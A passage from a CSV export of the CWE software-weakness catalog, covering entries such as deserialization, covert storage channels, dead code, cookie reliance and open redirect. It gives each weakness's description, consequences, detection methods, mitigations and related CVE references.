Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation.::\",\"::REFERENCE:CVE-2019-12799:DESCRIPTION:chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183):LINK:https://www.cve.org/CVERecord?id=CVE-2019-12799::REFERENCE:CVE-2015-8103:DESCRIPTION:Deserialization issue in commonly-used Java library allows remote execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-8103::REFERENCE:CVE-2015-4852:DESCRIPTION:Deserialization issue in commonly-used Java library allows remote execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-4852::REFERENCE:CVE-2013-1465:DESCRIPTION:Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-1465::REFERENCE:CVE-2012-3527:DESCRIPTION:Use of PHP unserialize function on untrusted input in content management system might allow code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3527::REFERENCE:CVE-2012-0911:DESCRIPTION:Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-0911::REFERENCE:CVE-2012-0911:DESCRIPTION:Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-0911::REFERENCE:CVE-2011-2520:DESCRIPTION:Python script allows local users to execute code via pickled data.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-2520::REFERENCE:CVE-2012-4406:DESCRIPTION:Unsafe deserialization using pickle in a Python script.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-4406::REFERENCE:CVE-2003-0791:DESCRIPTION:Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0791::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Deserialization of untrusted data::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER01-J:ENTRY NAME:Do not deviate from the proper signatures of serialization methods::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER03-J:ENTRY NAME:Do not serialize unencrypted, sensitive data::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER06-J:ENTRY NAME:Make defensive copies of private mutable components during deserialization::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER08-J:ENTRY NAME:Do not use the default serialized form for implementation defined invariants::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP25:ENTRY NAME:Tainted input to variable::\",::586::,\"::TYPE:Maintenance:NOTE:The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization.::\",\n515,\"Covert Storage Channel\",Base,Incomplete,\"A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.\",\"Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.\",::NATURE:ChildOf:CWE ID:514:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Covert storage channels may provide attackers with important information about the system in question.::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:If these messages or packets are sent with unnecessary data contained within, it may tip off malicious listeners as to the process that created the message. With this information, attackers may learn any number of things, including the hardware platform, operating system, or algorithms used by the sender. This information can be of significant value to the user in launching further attacks.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Ensure that all reserved fields are set to zero before messages are sent and that no unnecessary information is included.::\",\"\",,,\"::TAXONOMY NAME:Landwehr:ENTRY NAME:Storage::TAXONOMY NAME:CLASP:ENTRY NAME:Covert storage channel::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.9, members of the CWE Hardware SIG are working to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks that create or exploit covert channels. As a result of that work, this entry might change in CWE 4.10.::\","
  },
  "doc-0c6344615c894b582df8e2aa789519f1": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n561,\"Dead Code\",Base,Draft,\"The product contains dead code, which can never be executed.\",\"Dead code is code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.\",::NATURE:ChildOf:CWE ID:1164:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:NOTE:Dead code that results from code that can never be executed is an indication of problems with the source code that needs to be fixed and is an indication of poor quality.::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Binary / Bytecode Quality Analysis Compare binary / bytecode to application permission manifest:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Automated Monitored Execution:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Permission Manifest Analysis:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source Code Quality Analyzer Cost effective for partial coverage: Warning Flags Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Remove dead code before deploying the application.::PHASE:Testing:DESCRIPTION:Use a static analysis tool to spot dead code.::\",\"::REFERENCE:CVE-2014-1266:DESCRIPTION:chain: incorrect goto in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple goto fail bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).:LINK:https://www.cve.org/CVERecord?id=CVE-2014-1266::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC07-C:ENTRY NAME:Detect and remove dead code::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:MSC00-PL:ENTRY NAME:Detect and remove dead code:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP2:ENTRY NAME:Unused Entities::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-20::\",,\"\",\n562,\"Return of Stack Variable Address\",Base,Draft,\"A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.\",\"Because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. A subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. At best this will cause the value of the pointer to change unexpectedly. In many cases it causes the program to crash the next time the pointer is dereferenced.\",::NATURE:ChildOf:CWE ID:758:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:672:VIEW ID:1000::NATURE:CanPrecede:CWE ID:825:VIEW ID:1000::,\"::ORDINALITY:Indirect::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:NOTE:If the returned stack buffer address is dereferenced after the return, then an attacker may be able to modify or read memory, depending on how the address is used. If the address is used for reading, then the address itself may be exposed, or the contents that the address points to. If the address is used for writing, this can lead to a crash and possibly code execution.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Testing:DESCRIPTION:Use static analysis tools to spot return of the address of a stack variable.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:DCL30-C:ENTRY NAME:Declare objects with appropriate storage durations:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS34-C:ENTRY NAME:Do not call putenv() with a pointer to an automatic variable as the argument::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"\",\n563,\"Assignment to Variable without Use\",Base,Draft,\"The variable's value is assigned but never used, making it a dead store.\",\"After the assignment, the variable is either assigned another value or goes out of scope. It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.\",::NATURE:ChildOf:CWE ID:1164:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"::TERM:Unused Variable::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context:NOTE:This weakness could be an indication of a bug in the program or a deprecated variable that was not removed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Remove unused variables from the code.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC00-C:ENTRY NAME:Compile cleanly at high warning levels::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:MSC01-PL:ENTRY NAME:Detect and remove unused variables:MAPPING FIT:Imprecise::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP2:ENTRY NAME:Unused Entities::\",,\"\",\n565,\"Reliance on Cookies without Validation and Integrity Checking\",Base,Incomplete,\"The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.\",\"Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:669:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:602:VIEW ID:1000::,\"\",,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Avoid using cookie data for a security-related decision.::PHASE:Implementation:DESCRIPTION:Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.::PHASE:Architecture and Design:DESCRIPTION:Add integrity checks to detect tampering.::PHASE:Architecture and Design:DESCRIPTION:Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.::\",\"::REFERENCE:CVE-2008-5784:DESCRIPTION:e-dating application allows admin privileges by setting the admin cookie to 1.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5784::\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP29:ENTRY NAME:Faulty endpoint authentication::\",::226::31::39::,\"::TYPE:Relationship:NOTE:This problem can be primary to many types of weaknesses in web applications. A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks..::\",\n570,\"Expression is Always False\",Base,Draft,\"The product contains an expression that will always evaluate to false.\",\"\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:561:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Testing:DESCRIPTION:Use Static Analysis tools to spot such conditions.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC00-C:ENTRY NAME:Compile cleanly at high warning levels::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"\",\n571,\"Expression is Always True\",Base,Draft,\"The product contains an expression that will always evaluate to true.\",\"\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:561:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Testing:DESCRIPTION:Use Static Analysis tools to spot such conditions.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC00-C:ENTRY NAME:Compile cleanly at high warning levels::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"\",\n580,\"clone() Method Without super.clone()\",Variant,Draft,\"The product contains a clone() method that does not call super.clone() to obtain the new object.\",\"All implementations of clone() should obtain the new object by calling super.clone(). If a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:573:VIEW ID:1000::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Unexpected State:IMPACT:Quality Degradation::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Call super.clone() within your clone() method, when obtaining a new object.::PHASE:Implementation:DESCRIPTION:In some cases, you can eliminate the clone method altogether and use copy constructors.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP28:ENTRY NAME:Unexpected access points::\",,\"\",\n581,\"Object Model Violation: Just One of Equals and Hashcode Defined\",Variant,Draft,\"The product does not maintain equal hashcodes for equal objects.\",\"Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if a.equals(b) == true then a.hashCode() == b.hashCode().\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:697:VIEW ID:1000::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:If this invariant is not upheld, it is likely to cause trouble if objects of this class are stored in a collection. If the objects of the class in question are used as a key in a Hashtable or if they are inserted into a Map or Set, it is critical that equal objects have equal hashcodes.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Both Equals() and Hashcode() should be defined.::\",\"\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MET09-J:ENTRY NAME:Classes that define an equals() method must also define a hashCode() method::\",,\"\",\n584,\"Return Inside Finally Block\",Base,Draft,\"The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.\",\"\",::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Alter Execution Logic::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Do not use a return statement inside the finally block. The finally block should have cleanup code.::\",\"\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR04-J:ENTRY NAME:Do not complete abruptly from a finally block::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR05-J:ENTRY NAME:Do not let checked exceptions escape from a finally block::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP6:ENTRY NAME:Incorrect Exception Behavior::\",,\"\",\n586,\"Explicit Call to Finalize()\",Base,Draft,\"The product makes an explicit call to the finalize() method from outside the finalizer.\",\"While the Java Language Specification allows an object's finalize() method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling finalize() explicitly means that finalize() will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Unexpected State:IMPACT:Quality Degradation::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation Testing:DESCRIPTION:Do not make explicit calls to finalize(). Use static analysis tools to spot such instances.::\",\"\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MET12-J:ENTRY NAME:Do not use finalizers::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::\",,\"\",\n587,\"Assignment of a Fixed Address to a Pointer\",Variant,Draft,\"The product sets a pointer to a specific address other than NULL or 0.\",\"Using a fixed address is not portable, because that address will probably not be valid in all environments or platforms.\",::NATURE:ChildOf:CWE ID:344:VIEW ID:1000::NATURE:ChildOf:CWE ID:758:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Assembly:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:If one executes code at a known location, an attacker might be able to inject code there beforehand.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Reduce Maintainability:IMPACT:Reduce Reliability:NOTE:If the code is ported to another platform or environment, the pointer is likely to be invalid and cause a crash.::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Memory:IMPACT:Modify Memory:NOTE:The data at a known pointer location can be easily read or influenced by an attacker.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Never set a pointer to a fixed address.::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT36-C:ENTRY NAME:Converting a pointer to integer or integer to pointer:MAPPING FIT:Imprecise::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"\",\n601,\"URL Redirection to Untrusted Site ('Open Redirect')\",Base,Draft,\"A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.\",\"An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.\",::NATURE:ChildOf:CWE ID:610:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Undetermined::,\"::Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft.::\",\"::TERM:Open Redirect::TERM:Cross-site Redirect::TERM:Cross-domain Redirect::\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.::SCOPE:Access Control:SCOPE:Confidentiality:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:IMPACT:Other:NOTE:The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site.::\",\"::METHOD:Manual Static Analysis:DESCRIPTION:Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Dynamic Analysis:DESCRIPTION:Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. Use a list of approved URLs or domains to be used for redirection.::PHASE:Architecture and Design:DESCRIPTION:Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to /login.asp and ID 2 could map to http://www.example.com/. Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.::PHASE:Architecture and Design:DESCRIPTION:Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls. Many open redirect problems occur because the programmer assumed that certain 